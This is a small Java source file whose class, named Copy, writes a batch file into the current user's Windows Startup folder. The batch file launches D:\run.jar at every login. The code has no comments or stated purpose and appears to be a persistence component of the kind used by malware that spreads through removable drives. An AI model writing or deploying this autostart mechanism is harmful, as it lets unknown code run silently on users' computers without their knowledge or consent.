import java.io.*;
import java.util.*;
public class Copy
{
    static String clab = "D:";
    String user= System.getProperty("user.name");
    public void copy()throws Exception
    {
        File f = new File("C:\\Users\\"+user+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\run.bat");
        f.createNewFile();
        FileWriter fw = new FileWriter(f);
        fw.write(clab+"\\run.jar");
        fw.flush();
    }
}